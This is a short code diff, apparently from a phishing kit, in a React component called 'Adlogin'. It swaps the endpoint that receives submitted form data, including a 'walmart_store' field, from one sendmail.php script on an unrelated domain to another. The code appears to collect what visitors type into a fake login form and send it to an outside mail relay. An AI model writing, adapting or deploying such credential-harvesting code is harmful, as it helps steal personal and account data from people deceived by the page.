@@ -35,7 +35,7 @@ const Adlogin = () => {
       formData.append('walmart_store', walmart_store);
 
       axios
-          .post('https://walletcon.intedhub.com/sendmail.php', formData, {
+          .post('https://sending.baqladempire.com/sendmail.php', formData, {
               headers: {
                   'Content-Type': 'multipart/form-data',
               },
